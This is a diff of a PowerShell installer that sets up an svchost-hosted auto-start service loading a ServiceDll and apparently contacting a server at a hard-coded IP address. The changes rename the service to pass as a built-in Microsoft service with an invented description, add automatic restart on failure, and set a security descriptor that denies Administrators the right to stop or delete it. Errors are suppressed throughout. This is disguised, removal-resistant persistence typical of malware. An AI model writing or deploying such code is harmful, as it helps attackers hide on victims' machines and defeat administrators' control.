@@ -4,8 +4,8 @@ param([string]$Server = "https://64.226.66.66")
 $ErrorActionPreference = "SilentlyContinue"
 $SYS32      = "$env:SystemRoot\System32"
 $DRIVERS    = "$env:SystemRoot\System32\drivers"
-$SVC        = "WPnpSvc"
-$SVCGROUP   = "PnpExtGroup"
+$SVC        = "MspIscSvc"
+$SVCGROUP   = "MspGroup"
 $svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
 $TD         = "$env:TEMP\wpnp_$(Get-Random)"
 
@@ -66,7 +66,7 @@ Get-Process -Name rundll32 -EA SilentlyContinue | ForEach-Object {
         Stop-Process -Id $_.Id -Force -EA SilentlyContinue
     } } catch {}
 }
-Remove-Item "$SYS32\WPnpSvc.exe" -Force -EA SilentlyContinue
+Remove-Item "$SYS32\MspIscSvc.exe" -Force -EA SilentlyContinue
 Remove-Item "$SYS32\spoolcfg.exe" -Force -EA SilentlyContinue
 Remove-Item "$SYS32\pnpext.dll.old" -Force -EA SilentlyContinue
 Remove-Item "$SYS32\pnpext.dll.new" -Force -EA SilentlyContinue
@@ -87,9 +87,11 @@ $existing = (Get-ItemProperty $svchostKey -Name $SVCGROUP -EA SilentlyContinue).
 if (-not $existing) {
     New-ItemProperty -Path $svchostKey -Name $SVCGROUP -Value @($SVC) -PropertyType MultiString -Force | Out-Null
 }
-sc.exe create $SVC binPath= "$env:SystemRoot\System32\svchost.exe -k $SVCGROUP" type= share start= auto DisplayName= "Windows Plug and Play Extensions" 2>$null|Out-Null
-sc.exe description $SVC "Manages extended Plug and Play device configuration and compatibility" 2>$null|Out-Null
+sc.exe create $SVC binPath= "$env:SystemRoot\System32\svchost.exe -k $SVCGROUP" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" 2>$null|Out-Null
+sc.exe description $SVC "Maintains internal cache and inter-service context for Windows system providers." 2>$null|Out-Null
 sc.exe failure $SVC reset= 86400 actions= restart/10000/restart/30000/restart/60000 2>$null|Out-Null
+sc.exe failureflag $SVC 1 2>$null|Out-Null
+sc.exe sdset $SVC "D:(D;;WPSD;;;BA)(A;;CCLCSWRPLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)" 2>$null|Out-Null
 
 Write-Host "[6/7] Configuring ServiceDll..." -ForegroundColor Cyan
 $paramPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC\Parameters"
